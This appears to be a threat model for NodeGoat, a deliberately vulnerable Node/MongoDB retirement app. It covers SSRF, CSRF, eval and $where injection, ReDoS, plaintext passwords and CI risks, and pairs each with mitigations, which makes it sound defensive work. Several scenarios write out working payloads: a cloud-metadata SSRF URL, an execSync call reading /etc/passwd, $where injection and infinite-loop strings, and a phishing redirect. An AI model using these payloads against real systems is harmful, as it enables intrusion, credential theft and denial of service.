components.name: End User (Browser)
components.description: A person using the RetireEasy/NodeGoat web application through a browser: signs up, logs in, views dashboard, edits profile, contributions, allocations, memos and research.

components.name: NodeGoat Express Web App
components.description: Express 4 application (server.js) that serves server-rendered HTML views via swig/consolidate and handles all routes for login, signup, profile, contributions, benefits, allocations, memos, research, learn redirect and tutorial pages. Mounts express-session for session state; helmet and csurf are present as dependencies but commented out in server.js.

components.name: Session Handler / Authentication
components.description: In-process authentication and session management: handleLoginRequest validates credentials via UserDAO, isLoggedInMiddleware and isAdminUserMiddleware gate routes based on req.session.userId. Passwords are compared with === against stored values. Session cookie secret is hardcoded in config/env/all.js.

components.name: Mongo Data Access Layer (DAOs)
components.description: DAO modules that build and execute MongoDB queries for users, profiles, allocations, contributions, benefits, memos and research. AllocationsDAO interpolates the request-supplied threshold into a $where JavaScript clause.

components.name: MongoDB (nodegoat)
components.description: MongoDB 4.4 instance holding users, allocations, contributions, benefits and memos collections. Connection string comes from the MONGODB_URI environment variable; in docker-compose it is mongodb://mongo:27017/nodegoat with no credentials.

components.name: DB Reset / Seed Script
components.description: artifacts/db-reset.js drops and recreates collections and inserts default admin and user accounts with fixed passwords. Run at container start in docker-compose and as a Heroku postdeploy script.

components.name: External Stock Research Endpoint
components.description: Outbound HTTP fetch made by the research handler using needle to a URL whose host and path prefix come from the request query string (default https://finance.yahoo.com/quote/). The fetched body is written directly into the response.
assets: fetched third-party content rendered to users

components.name: External Redirect Target
components.description: Arbitrary external site that /learn redirects the browser to, taken unvalidated from the url query parameter.

components.name: Tutorial Pages
components.description: Unauthenticated Express router serving static OWASP Top 10 tutorial pages rendered from swig templates under /tutorial.

components.name: GitHub Actions CI
components.description: GitHub Actions workflows running Cypress end-to-end tests against the app with a MongoDB container, and a jshint lint job.

components.name: mongo (compose)
components.description: Deployment target (compose) mongo defined in docker-compose.yml.

components.name: web (compose)
components.description: Deployment target (compose) web defined in docker-compose.yml, ports 4000.

Does the error handler in nodegoat-web (app/routes/error.js rendering error-template.html with the raw error object) suppress stack traces and internal details when NODE_ENV is production?

Does nodegoat-web emit security-relevant audit logs (failed logins, benefit and profile changes) beyond the console.error in app/routes/error.js, so that abuse of the benefits and allocations routes can be detected?

Is the outbound URL used by nodegoat-web when calling external-stock-service restricted to an allow-list of hosts, so an attacker cannot point the /research fetch at internal services or cloud metadata endpoints?
Is swig autoescaping enabled for the views rendered by nodegoat-web, so that memo text passed through marked and profile fields such as firstName are output-encoded rather than injected as HTML?

A stored password is compared with ===, which means it is stored in plaintext (a hash is compared with bcrypt.compare or similar, never ===). Store and compare a salted password hash.

threats.title: Session cookie and personal financial pages transmitted over plaintext HTTP on the app-render-to-user flow
threats.asset: session cookie and rendered pages containing SSN, date of birth and bank account numbers
threats.attackScenario: The app is served by http.createServer(app) at server.js:145 with the HTTPS block commented out and the session cookie's secure/httpOnly options left commented at server.js:92-100, so an attacker on the same Wi-Fi as a victim passively captures the connect.sid cookie and the /profile HTML from the app-render-to-user flow and replays the cookie to impersonate the user.
assumptions: No TLS termination exists anywhere in front of nodegoat-web, so credentials and session cookies are assumed to travel in plaintext.
No TLS-terminating reverse proxy is deployed in front of the Express server, so the flow is plaintext HTTP end to end.
The session cookie is issued without the Secure and HttpOnly attributes.
threats.impactReason: Interception yields both a replayable session cookie and the plaintext SSN, DOB and bank routing numbers rendered on profile pages.
threats.likelihoodReason: Passive interception requires network adjacency to the victim, but the protocol on this flow is stated as HTTP and the server listens with plain http.createServer. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Serve the application over HTTPS and harden the session cookie.
steps: Switch server.js:145 to the commented https.createServer(httpsOptions, app) block and redirect all HTTP traffic to HTTPS.
Set cookie: { httpOnly: true, secure: true, sameSite: 'lax', maxAge: ... } in the express-session options at server.js:78.
Enable helmet.hsts() so browsers refuse plaintext connections on later visits.

threats.title: Missing security response headers allow clickjacking and unrestricted script injection in rendered pages sent to the browser
threats.asset: user session state and personal financial data displayed in rendered pages (SSN, bank account numbers, memos)
threats.attackScenario: With helmet left uninstantiated (server.js:38-65 keeps frameguard, contentSecurityPolicy, hsts and nosniff commented out), an attacker frames /profile or /contributions inside their own page and overlays invisible buttons so a logged-in victim submits the profile form unknowingly, and any injected script in a memo rendered on app-render-to-user runs with no Content-Security-Policy to block exfiltration of the page's SSN and bank fields.
assumptions: No reverse proxy or CDN in front of the Express app adds X-Frame-Options, Content-Security-Policy or HSTS headers.
threats.impactReason: Absence of CSP and frame protection turns any stored-script or UI-redress issue into full theft of displayed SSN, bank account and routing numbers.
threats.likelihoodReason: Every HTML response on the app-render-to-user flow lacks the headers and the pages are reachable by any logged-in victim who can be lured to an attacker page.

mitigation.summary: Enable the already-installed helmet middleware and restore autoescaping.
steps: Uncomment and mount helmet.frameguard(), helmet.contentSecurityPolicy(), helmet.hsts() and dont-sniff-mimetype in server.js before routes(app, db); both packages are already in package.json.
Call app.disable("x-powered-by") as the commented block at server.js:42 shows.
Set swig.setDefaults({ autoescape: true }) at server.js:135 so rendered profile and memo fields are escaped.

threats.title: Server-side request forgery via the url parameter on GET /research reflected into the response
threats.asset: internal network services and cloud instance metadata reachable from the NodeGoat server
threats.attackScenario: A logged-in attacker requests /research?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/&symbol=; app/routes/research.js:15-16 concatenates the query parameters into a needle.get() with no host allow-list and writes the raw response body back to the browser, handing the attacker cloud credentials or internal service responses over the app-render-to-user flow.
assumptions: No egress allow-list or network policy restricts outbound HTTP from the application host.
threats.impactReason: The response body is echoed verbatim, so internal admin endpoints or instance metadata credentials are directly readable by the attacker.
threats.likelihoodReason: Any self-registered logged-in user can set the url query parameter; no validation or allow-list stands between it and needle.get.

mitigation.summary: Remove the attacker-controlled base URL and fetch only from a fixed provider.
steps: In app/routes/research.js build the URL from a hardcoded research provider base plus a validated symbol, ignoring req.query.url.
Validate req.query.symbol against /^[A-Z.]{1,10}$/ before use.
Do not write the upstream body directly into the response; parse and render only the expected fields.

threats.title: Stack traces rendered to the browser by the global error handler
threats.asset: internal file paths, module versions and stack frames of the NodeGoat server
threats.attackScenario: An attacker triggers a handler failure (for example by posting a non-numeric userId to /benefits so benefitsDAO.updateBenefits errors), and the error middleware at app/routes/error.js:10-12 renders the whole error object into error-template, returning the stack trace and absolute server paths over the app-render-to-user flow, which the attacker uses to map the deployment before attacking the eval() sink.
assumptions: NODE_ENV is not used anywhere to suppress error detail in production.
The error-template view prints the passed error object's message and stack rather than a generic message.
threats.impactReason: Leaked paths and stack frames aid further exploitation but are not themselves user data.
threats.likelihoodReason: Any user who can reach a route that throws receives the rendered error page; errors are easy to induce with malformed form fields.

mitigation.summary: Render a generic error page and log details server-side only.
steps: In app/routes/error.js pass only a static message to res.render and keep err.stack in the server log.
Gate any detailed output behind a NODE_ENV !== 'production' check.

threats.title: Missing CSRF protection lets a cross-site form drive the profile and contributions DAO writes
threats.asset: bank account and routing numbers and contribution percentages in the users and contributions collections
threats.attackScenario: Cookie sessions are used and POST /profile and POST /contributions change state with no CSRF token, so an attacker hosts a page that auto-submits a form to /profile carrying their own bankAcc and bankRouting values, and a logged-in victim's browser replays the session cookie so ProfileDAO.updateUser overwrites the victim's bank details.
assumptions: The csurf dependency declared in package.json is not wired into the Express app at runtime, so no token is required on state-changing POSTs.
threats.impactReason: An attacker silently rewrites a victim's stored bank account and routing numbers and contribution percentages through the DAO layer.
threats.likelihoodReason: Requires a logged-in victim to visit an attacker page, but no other privilege; the routes accept simple form posts.

mitigation.summary: Enable the csurf middleware already listed in package.json and emit tokens in every state-changing form.
steps: Uncomment `const csrf = require('csurf')` in server.js and add `app.use(csrf())` after the session middleware.
Add a hidden `_csrf` field to the profile, contributions, memos, benefits, login and signup templates.
Set the session cookie to SameSite=Lax as defence in depth.

threats.title: Server-side JavaScript injection through the contributions form reaches the contributions DAO write
threats.asset: contribution records in the contributions collection and the whole Mongo dataset reachable from the Node process
threats.attackScenario: POST /contributions passes req.body.preTax, afterTax and roth to eval() at app/routes/contributions.js:32-34 before handing the values to ContributionsDAO.update, so an attacker submits preTax=require('child_process').execSync('cat /etc/passwd')||0 and executes arbitrary code in the Node process that owns the Mongo connection, then reads or rewrites any collection through that connection.
assumptions: The eval() calls at app/routes/contributions.js:32-34 are the live code path for POST /contributions rather than dead code.
threats.impactReason: Code execution in the app process grants full read and write access to the users collection, which holds plaintext passwords, SSN, DOB and bank account and routing numbers.
threats.likelihoodReason: Any self-registered, logged-in user can post the form field; no special position or timing is required.

mitigation.summary: Replace eval() with numeric parsing before the values are written through the DAO.
steps: In app/routes/contributions.js use the already-commented `parseInt(req.body.preTax, 10)` form for preTax, afterTax and roth.
Reject non-integer or out-of-range values before calling contributionsDAO.update.

threats.title: Passwords are written to the users collection in plaintext by the user DAO
threats.asset: user records with plaintext passwords
threats.attackScenario: UserDAO.addUser at app/data/user-dao.js:17-31 places the password received from the signup request straight into the user document with the bcrypt hashing line commented out, and validateLogin compares it with `fromDB === fromUser`, so anyone who reaches the users collection - through the eval() injection on POST /contributions, a Mongo backup or a console - reads every user's password in clear text and reuses it on other sites.
assumptions: The commented-out bcrypt.hashSync line in app/data/user-dao.js is the deployed state, so no hashing happens anywhere on the signup path.
threats.impactReason: Every account password is directly usable, including admin accounts, and is likely reused on other services by the same users.
threats.likelihoodReason: The flaw is unconditional on every signup; exploitation only requires any read of the users collection, which several other flaws in this application enable.

mitigation.summary: Hash passwords with the bcrypt library already present before storing them, and compare with bcrypt on login.
steps: In app/data/user-dao.js store `password: bcrypt.hashSync(password, bcrypt.genSaltSync())` instead of the raw request value.
Change comparePassword in validateLogin to `bcrypt.compareSync(fromUser, fromDB)`.
Migrate existing rows by forcing a password reset for all accounts.

threats.title: Regex backtracking on the bankRouting field stalls the request thread before the profile DAO write
threats.asset: availability of the profile update path and the shared Node event loop serving all DAO calls
threats.attackScenario: POST /profile validates bankRouting with the nested-quantifier regex /([0-9]+)+\#/ at app/routes/profile.js:59 before calling ProfileDAO.updateUser, so an attacker submits a bankRouting value of many digits with no trailing '#' and the single-threaded Node process spins on catastrophic backtracking, blocking every other user's DAO request.
assumptions: No rate limiting or lockout is applied, so login and signup are assumed to be brute-forceable without restriction.
The regexPattern at app/routes/profile.js:59 is applied to the unbounded bankRouting value taken from req.body.
threats.impactReason: A single request pins the event loop, so all route handlers and all DAO traffic stop until the process is restarted.
threats.likelihoodReason: Any logged-in user can post the field, and the payload is a short string of digits. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Remove the nested quantifier from the bankRouting validation regex and bound the input length.
steps: Replace `/([0-9]+)+\#/` with `/^([0-9]+)\#$/` in app/routes/profile.js as the file's own comment describes.
Reject bankRouting values longer than a fixed maximum before running the regex.

threats.title: Missing CSRF protection lets a third-party page drive state-changing DAO writes through the authenticated session
threats.asset: user profile records written through the DAO layer (bank account, routing number, SSN, DOB)
threats.attackScenario: Cookie sessions are used with no csurf middleware or token check on state-changing POSTs such as POST /login (app/routes/index.js:34), so an attacker hosts a page that auto-submits a cross-site form to the victim's browser; the browser attaches connect.sid, the session handler forwards the request through the auth-to-dao in-process call chain, and the attacker either fixates the victim into an attacker-controlled account or causes writes to the victim's profile document.
assumptions: No SameSite attribute is set on the session cookie, so it accompanies cross-site form posts.
threats.impactReason: Cross-site writes reach the users collection holding SSN, DOB and bank details via the DAO layer.
threats.likelihoodReason: Requires luring an authenticated victim to an attacker page, but no token or origin check stands in the way once they arrive.

mitigation.summary: Enable CSRF tokens on all state-changing routes and set SameSite on the session cookie.
steps: Uncomment and enable the csurf middleware block at server.js:104-113 and add the hidden csrftoken field to each form template.
Set `cookie: { sameSite: 'strict' }` in the session options at server.js:78.
Reject state-changing requests whose Origin header does not match hostName from config/env/all.js.

threats.title: Absent security response headers expose DAO-sourced profile data to script injection and framing
threats.asset: user profile data rendered from the DAO layer (SSN, DOB, bank details) and session identifiers
threats.attackScenario: Express is configured in server.js with the helmet require commented out at line 10 and every helmet call commented at lines 38-65, so no Content-Security-Policy, X-Frame-Options or X-Content-Type-Options is sent; combined with swig autoescape:false at server.js:137, an attacker who plants script into a profile or memo field renders it with no CSP fallback on the dashboard page that displays the record returned across auth-to-dao, exfiltrating the victim's SSN and bank details.
assumptions: No reverse proxy injects the missing security headers for this deployment.
threats.impactReason: Without CSP or frame protection, injected script can read rendered SSN, DOB and bank fields and the session cookie.
threats.likelihoodReason: The application stores user-controlled fields and renders them with autoescape disabled, so the missing header removes the last defence layer.

mitigation.summary: Add helmet with a restrictive Content-Security-Policy and re-enable template autoescaping.
steps: Uncomment the helmet require at server.js:10 and register helmet() including contentSecurityPolicy, frameguard, noSniff and hsts before routes(app, db).
Set swig.setDefaults({ autoescape: true }) at server.js:135.
Call app.disable('x-powered-by').

threats.title: Cypress fixture credentials are replayed against a live app instance started by CI
threats.asset: test fixture credentials (admin and user accounts)
threats.attackScenario: The e2e workflow at .github/workflows/e2e-test.yml runs on every `pull_request` and boots the app with `NODE_ENV=test npm start`, while test/e2e/support/commands.js signs in with credentials read from the committed fixtures test/e2e/fixtures/users/admin.json and users/user.json; an attacker who reads those fixtures in the public repository takes the admin username and password and replays them against any deployed NodeGoat instance seeded by `npm run db:seed` to log in as the admin user.
assumptions: At least one non-CI deployment is seeded with the same `npm run db:seed` dataset.
The fixture files test/e2e/fixtures/users/admin.json and users/user.json contain literal credentials that match the seeded database users.
threats.impactReason: The admin fixture grants administrative sign-in, exposing benefits administration and all non-admin user records.
threats.likelihoodReason: The fixtures are committed to a public repository and the sign-in command that uses them is plainly documented, but a reachable non-test deployment seeded identically is required.

mitigation.summary: Generate e2e sign-in credentials at runtime instead of committing them, and never seed the same accounts outside CI.
steps: Replace the fixture lookups in test/e2e/support/commands.js with credentials injected from GitHub Actions secrets or generated per-run in test/e2e/plugins/index.js.
Make `npm run db:seed` refuse to run unless NODE_ENV=test so seeded admin accounts cannot appear in a deployed environment.
Rotate any credentials currently present in test/e2e/fixtures/users/*.json.

threats.title: Absent security response headers leave the HTTP responses on ci-to-app open to injection and framing
threats.asset: user session state and rendered profile and memo content
threats.attackScenario: The responses returned over ci-to-app carry no Content-Security-Policy, X-Frame-Options, HSTS or X-Content-Type-Options because helmet is left commented out in server.js while it is declared in package.json:16, so an attacker who lands any script into a rendered field — for example the memo body stored through POST /memos and echoed by memosDAO.getAllMemos into the memos template — has no CSP to stop it exfiltrating the session, and can additionally frame /profile to clickjack a bank-detail update.
assumptions: No TLS termination exists anywhere in front of nodegoat-web, so credentials and session cookies are assumed to travel in plaintext.
The swig templates rendering memo and profile values do not universally escape or sanitise the stored strings.
threats.impactReason: Without CSP or frame protection an injected script or a framed page can reach session state and the profile update form.
threats.likelihoodReason: The headers are simply absent on every response; exploitation still needs an injection sink or a user lured to a framing page. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Enable the helmet middleware already present as a dependency and disable the x-powered-by banner.
steps: Uncomment the helmet require and `app.use(helmet...)` block in server.js so contentSecurityPolicy, frameguard, hsts and noSniff are applied.
Add `app.disable("x-powered-by")` before routes are mounted in server.js.
Define an explicit CSP directive set that forbids inline script so the environmentalScripts injection point cannot load arbitrary origins.

threats.title: Missing CSRF protection lets a third-party page drive state-changing POSTs carried over the ci-to-app flow
threats.asset: user profile records (SSN, date of birth, bank account and routing numbers) and contribution percentages
threats.attackScenario: The HTTP requests on ci-to-app include the cookie-session POSTs registered at app/routes/index.js:34 (/login), :48 (/profile) and :52 (/contributions), and no CSRF token accompanies them; an attacker hosts a page that auto-submits a form to POST /profile, and a signed-in victim's browser replays the express-session cookie so bankAcc and bankRouting are overwritten with the attacker's account details.
assumptions: The session cookie is sent on cross-site form submissions, i.e. no SameSite=Strict/Lax default blocks the POST in the victim's browser.
threats.impactReason: A forged POST /profile rewrites bank routing and account numbers and SSN for any signed-in user.
threats.likelihoodReason: Any page a signed-in user visits can issue the form POST; no attacker position on the network is needed.

mitigation.summary: Enable the csurf middleware already declared in package.json and emit tokens in every state-changing form.
steps: Uncomment the `csrf` require in server.js and register `app.use(csrf())` after the express-session middleware.
Pass `csrfToken: req.csrfToken()` into the login, profile, contributions, benefits and memos renders and add a hidden `_csrf` input to each form template.
Set the session cookie to `sameSite: "strict"` in the express-session options in server.js.

threats.title: Open redirect on GET /learn lets CI-exercised traffic be steered to an attacker host
threats.asset: user session credentials harvested through a spoofed login page
threats.attackScenario: GET /learn at app/routes/index.js:70 passes `req.query.url` straight into res.redirect with no allowlist, so an attacker sends a signed-in user a link to /learn?url=https://evil.example/login that lands them on a cloned NodeGoat login form where the re-entered username and password are captured.
assumptions: No upstream middleware rewrites or validates req.query.url before the handler executes.
threats.impactReason: The redirect carries the application's own domain reputation into a credential-phishing page, and the raw parameter also permits javascript:-style targets on lenient clients.
threats.likelihoodReason: Any logged-in user clicking a crafted link triggers it, and the parameter is fully attacker-controlled with no validation library imported in that file.

mitigation.summary: Restrict /learn to a fixed set of known learning-resource destinations.
steps: Replace `res.redirect(req.query.url)` at app/routes/index.js:72 with a lookup of req.query.url against a hardcoded map of permitted absolute URLs.
Return 400 when the supplied value is not in the map instead of redirecting.
Reject any value that is not an absolute https URL on an allowlisted host.

threats.title: Unpinned third-party CI actions and a floating MongoDB image allow tampering with the build
threats.asset: build artifacts and the CI runner environment
threats.attackScenario: Both workflows reference mutable tags — actions/checkout@v2, actions/setup-node@v1, actions/cache@v2, actions/upload-artifact@v2 in .github/workflows/e2e-test.yml and `npx --no-install jshint@2.12.0 .` plus the same actions in .github/workflows/lint.yml, alongside `docker run -d -p 27017:27017 mongo:4.0` — so an attacker who compromises one of those mutable tags or the registry image pushes a new revision that executes arbitrary code inside the runner during `npm ci` and rewrites the cypress artifacts uploaded by the job.
assumptions: The referenced action tags and the mongo:4.0 image tag are mutable and are resolved at run time rather than pinned by digest.
threats.impactReason: Code executing in the runner can alter build artifacts and read any secret or token exposed to the job.
threats.likelihoodReason: Requires compromising a widely watched upstream action or Docker Hub image, which is uncommon but has precedent.

mitigation.summary: Pin every external action and container image to an immutable digest.
steps: Replace actions/checkout@v2, actions/setup-node@v1, actions/cache@v2 and actions/upload-artifact@v2 in both workflow files with full commit SHAs.
Pin the MongoDB container in the 'Start MongoDB' step to mongo@sha256:... instead of mongo:4.0.
Add an explicit minimal `permissions:` block to both workflows so the GITHUB_TOKEN is read-only.

threats.title: Cypress failure artifacts from pull_request runs can leak seeded personal data
threats.asset: screen recordings and screenshots of seeded profile data (SSN, date of birth, bank account and routing numbers)
threats.attackScenario: The e2e workflow runs `npm run test:ci -- --config video=true` and on failure uploads the whole test/e2e/screenshots and videos tree as the `cypress-artifacts-node${{ matrix.node-version }}` artifact; since the suite signs in via cy.signIn and drives /profile and /allocations, a failing run records the seeded SSN, DOB and bank account fields into a video that anyone able to download the workflow artifact can replay.
assumptions: The Cypress suite navigates pages that render profile fields such as ssn, dob, bankAcc and bankRouting while recording.
Workflow artifacts are downloadable by anyone who can view the repository's Actions runs.
threats.impactReason: Only seeded test data is captured, so real customer records are not disclosed unless the seed is shared with a real environment.
threats.likelihoodReason: Video recording is forced on in CI and artifact upload triggers automatically on every failing run of a push or pull request.

mitigation.summary: Stop recording and publishing screens that render sensitive fields, and restrict artifact retention.
steps: Remove `--config video=true` from the 'Run E2E test suite' step or limit recording to the specs that do not visit /profile.
Add a short `retention-days` value to the actions/upload-artifact step in .github/workflows/e2e-test.yml.
Use obviously fake, non-PII values for ssn, dob, bankAcc and bankRouting in the seed data used by `npm run db:seed`.

threats.title: Insecure direct object reference on GET /allocations/:userId exposed over the ci-to-app HTTP flow
threats.asset: other users' retirement allocation records
threats.attackScenario: GET /allocations/:userId at app/routes/index.js:63 is guarded only by isLoggedIn and app/routes/allocations.js reads the id from req.params rather than req.session, so an attacker registers via POST /signup, notes their own numeric userId and then requests /allocations/1, /allocations/2 and so on to read every other user's stock, fund and bond allocations.
assumptions: User ids are the sequential integers produced by the counters collection, making neighbouring ids trivially guessable.
threats.impactReason: Every user's allocation record is enumerable one id at a time by any account holder.
threats.likelihoodReason: Self-service signup is open and the id is a sequential path segment requiring no special position.

mitigation.summary: Derive the allocations user id from the session instead of the URL parameter.
steps: In app/routes/allocations.js replace `const { userId } = req.params;` with `const { userId } = req.session;` as the commented fix at lines 12-15 indicates.
Change the route in app/routes/index.js:63 to GET /allocations with no id segment, or compare req.params.userId to req.session.userId and return 404 on mismatch.

threats.title: Unauthenticated MongoDB connection string allows spoofing the DAO client on the dao-to-mongo flow
threats.asset: user documents including plaintext passwords, SSN and bank account data
threats.attackScenario: config/env/all.js:3 and docker-compose.yml:8 define the database as mongodb://mongo:27017/nodegoat with no username, password or TLS parameters, so anyone who reaches port 27017 on the compose network — for example from another container or a co-located process — connects as an anonymous client indistinguishable from the DAOs and reads or rewrites the users collection, which holds plaintext passwords, SSN and bankAcc fields.
assumptions: MongoDB is assumed to be running without authentication, exactly as the credential-less connection string in docker-compose.yml suggests.
No network policy restricts which workloads can reach the mongo container on port 27017.
The mongo service is started without authentication enabled, matching the credential-free URI in docker-compose.yml and config/env/all.js.
threats.impactReason: Direct database access yields every user's plaintext password, SSN and bank details and permits arbitrary tampering with allocations and benefits.
threats.likelihoodReason: Requires a foothold on the container network, but once there no credential or transport protection stands in the way. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Require authenticated, TLS-protected connections to MongoDB.
steps: Create a least-privilege application user in the mongo service and set MONGODB_URI in docker-compose.yml to include those credentials sourced from a secret, not a literal.
Start mongod with --auth and --tlsMode requireTLS, and pass the matching TLS options to MongoClient.connect in server.js.
Keep port 27017 unpublished (as docker-compose.yml already does with expose) and restrict it to the web service on the compose network.

threats.title: Injected $where predicate tampers with the DAO-to-MongoDB query on the wire path
threats.asset: retirement allocation records for all users
threats.attackScenario: The dao-to-mongo flow carries a $where clause assembled at app/data/allocations-dao.js:78 from the threshold query parameter, so an attacker supplies threshold=1' || this.userId != -1 || '1 and the query that crosses to the nodegoat MongoDB instance is no longer scoped to their own userId, returning every user's allocation documents back over the same flow.
assumptions: The threshold value is taken from the HTTP request and passed unmodified to getByUserIdAndThreshold.
threats.impactReason: The semantics of every allocations query on this flow become attacker-defined, exposing all users' allocation records.
threats.likelihoodReason: A single crafted query parameter from an ordinary session alters the query sent to MongoDB.

mitigation.summary: Send only structured, typed query documents over the DAO-to-MongoDB flow.
steps: Build the allocations filter from BSON operators with a parsed integer threshold in app/data/allocations-dao.js instead of a JavaScript string.
Add a DAO-level guard that rejects any query object containing a $where key before it is passed to the mongodb driver.
Disable server-side JavaScript on the mongo service defined in docker-compose.yml.

threats.title: Denial of service through an infinite loop injected into the $where clause
threats.asset: availability of the MongoDB nodegoat instance and the allocations query path
threats.attackScenario: Because app/data/allocations-dao.js:78 interpolates threshold into server-side JavaScript, an attacker submits threshold=0';while(true){}' so the $where predicate never returns, pinning a MongoDB JavaScript execution thread and stalling allocation queries for every user; repeating the request exhausts the database's evaluation capacity.
assumptions: The MongoDB deployment permits server-side JavaScript evaluation for $where and no query execution timeout is configured.
threats.impactReason: A handful of requests can hang database-side JavaScript execution and make the application unresponsive for all users.
threats.likelihoodReason: The injection point is reachable from a normal request parameter, though it requires an authenticated session to reach the allocations route.

mitigation.summary: Eliminate $where and bound query execution time.
steps: Rewrite the threshold filter in app/data/allocations-dao.js as {stocks: {$gt: parsedThreshold}} so no user text is evaluated as JavaScript.
Disable server-side JavaScript on the MongoDB instance (security.javascriptEnabled: false) in the deployment used by docker-compose.yml.
Apply maxTimeMS to the allocations find() call so long-running predicates are aborted.

threats.title: Passwords stored in plaintext and compared with === in UserDAO.validateLogin
threats.asset: stored user passwords
threats.attackScenario: app/data/user-dao.js:61 compares the submitted password to the stored value with `fromDB === fromUser`, proving the users collection holds passwords as cleartext, so anyone who reaches the nodegoat database — through the $where injection in allocations-dao.js, a Mongo backup, or direct access to the container — reads usable login credentials for every account and signs in as those users, including any admin.
threats.impactReason: Every account's password is directly usable for impersonation on this application and likely reused elsewhere.
threats.likelihoodReason: The plaintext storage is certain from the comparison code, and this batch already contains an injection path into the same database.

mitigation.summary: Store salted password hashes and compare with bcrypt.
steps: In app/data/user-dao.js addUser, hash the password with bcrypt-nodejs (already a declared dependency in package.json) before inserting the user document.
Replace the === comparison at app/data/user-dao.js:61 with bcrypt.compareSync(fromUser, fromDB).
Migrate existing user documents by forcing a password reset, since the stored cleartext cannot be trusted.

threats.title: Cross-site request forgery drives DAO writes to profile, contribution and benefit records
threats.asset: user profile records (SSN, DOB, bank account and routing numbers) and contribution records
threats.attackScenario: With cookie sessions and no CSRF token checked on state-changing POST routes, an attacker hosts a page that auto-submits a form to the profile update endpoint, and a logged-in victim's browser sends the session cookie so ProfileDAO.updateUser at app/data/profile-dao.js:42 overwrites the victim's bankAcc and bankRouting fields with attacker-controlled values.
assumptions: The profile and contribution update routes are served over the same cookie session as POST /login and accept ordinary form-encoded bodies.
threats.impactReason: Bank routing and account fields for a victim's payout can be silently rewritten, and contribution allocations altered.
threats.likelihoodReason: Only requires a victim with an active session to visit an attacker-controlled page; no credentials are needed.

mitigation.summary: Enable CSRF token validation on all state-changing routes that reach the DAOs.
steps: Enable the already-declared csurf dependency in server.js (the require is currently commented out at server.js:7) and register it after the session middleware.
Render the CSRF token into every form that posts to profile, contributions, allocations and memos handlers.
Set sameSite: 'strict' on the session cookie in the express-session configuration as defence in depth.

threats.title: Server-side JavaScript injection via the threshold parameter in AllocationsDAO.getByUserIdAndThreshold
threats.asset: allocation records and any other document readable through the $where JavaScript context
threats.attackScenario: app/data/allocations-dao.js:78 builds `{$where: "this.userId == <id> && this.stocks > '<threshold>'"}` by interpolating the request-supplied threshold with no parsing or escaping, so an attacker requests the allocations page with threshold=1'; return 1 == '1 and makes the $where clause evaluate true for every allocation document, returning other users' allocation records instead of their own.
assumptions: The threshold value reaching getByUserIdAndThreshold originates from an HTTP query or form parameter.
threats.impactReason: Arbitrary JavaScript runs inside the MongoDB query evaluation, exposing every allocation document and allowing predicate manipulation across the collection.
threats.likelihoodReason: The parameter is directly attacker-controlled from a normal application page and the injection needs no special tooling.

mitigation.summary: Replace the $where clause with typed query operators.
steps: In app/data/allocations-dao.js:57-84 coerce threshold with parseInt(threshold, 10) and reject non-numeric or out-of-range values before querying.
Express the filter as {userId: parsedUserId, stocks: {$gt: parsedThreshold}} so no JavaScript source is constructed.
Remove the $where usage entirely so no request value is ever interpolated into database-side JavaScript.

threats.title: DAO writes such as benefit start dates and memos leave no attributable audit record
threats.asset: integrity records for benefit start dates and memo entries
threats.attackScenario: BenefitsDAO.updateBenefits at app/data/benefits-dao.js:23 writes a new benefitStartDate onto an arbitrary user document and only console.logs "Updated benefits" with no actor, target or previous value, and MemosDAO.insert at app/data/memos-dao.js:15 stores a memo with no author field, so an attacker who obtains a session (trivially, given plaintext passwords) changes another employee's benefit start date or plants a memo and the stored data cannot be tied back to them.
assumptions: No logging or audit middleware outside these DAO modules records the acting user id for benefit and memo writes.
threats.impactReason: Financially meaningful changes to benefit dates and posted memos cannot be attributed or reconstructed after the fact.
threats.likelihoodReason: Any session holder reaching the benefits or memos handlers produces unattributable writes as normal behaviour.

mitigation.summary: Record the acting user and prior value for every DAO mutation.
steps: Pass the session user id into BenefitsDAO.updateBenefits and MemosDAO.insert and persist it on the written document.
Write an append-only audit entry (collection or structured log) containing actor, target user id, field, old value, new value and timestamp instead of console.log at app/data/benefits-dao.js:33.
Add a createdBy field to the memo document built at app/data/memos-dao.js:18.

threats.title: Seed script writes default credentials to MongoDB over an unauthenticated, unencrypted wire connection
threats.asset: seeded default account credentials and the user documents containing SSN and bank account data
threats.attackScenario: docker-compose.yml line 8 sets MONGODB_URI to `mongodb://mongo:27017/nodegoat` with no username, password or tls option, and config/env/all.js line 3 falls back to `mongodb://localhost:27017/nodegoat`, so an attacker on the shared docker bridge network connects directly to mongo:27017 with a mongo shell, or sniffs the seed script's wire-protocol inserts, and reads or rewrites the admin document that artifacts/db-reset.js:12-20 is inserting.
assumptions: MongoDB is assumed to be running without authentication, exactly as the credential-less connection string in docker-compose.yml suggests.
No network policy isolates the mongo service from other workloads on the same Docker network.
The MongoDB container started from the mongo:4.4 image in docker-compose.yml runs without authentication enabled, as the credential-less URI implies.
threats.impactReason: Direct wire access to the nodegoat database exposes and allows modification of every user document, including plaintext passwords, SSN and bank account fields.
threats.likelihoodReason: Requires a foothold on the same Docker network or link path rather than public internet access, but no credential is needed once there. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Authenticate and encrypt the seed script's MongoDB connection.
steps: Enable authentication on the mongo service in docker-compose.yml and set MONGODB_URI to include a dedicated seed user's credentials supplied via secrets, not inline in the compose file.
Append `?tls=true` (or the 2.x driver's `ssl=true`) to the connection string and pass a CA file so the MongoClient.connect call in artifacts/db-reset.js negotiates TLS.
Grant the seed user only the roles needed on the nodegoat database instead of a cluster-wide role.

threats.title: Seed script drops production collections on every container start and Heroku deploy
threats.asset: user documents including SSN, bank account and retirement allocation records in the nodegoat database
threats.attackScenario: docker-compose.yml line 9 runs `node artifacts/db-reset.js` before `npm start`, and app.json line 13 registers the same script as a Heroku `postdeploy` hook with NODE_ENV set to production, so anyone who can trigger a redeploy or a container restart causes tryDropCollection (artifacts/db-reset.js:39) to drop the users and allocations collections and replace them with the three fixed accounts, destroying all live user data.
assumptions: The same MONGODB_URI used by the running application is the one the seed script connects to, so the drop affects live data rather than a throwaway database.
threats.impactReason: Every collection in the nodegoat database, including user documents with SSN and bank account data, is dropped and replaced with three seed accounts; the data is unrecoverable without a backup.
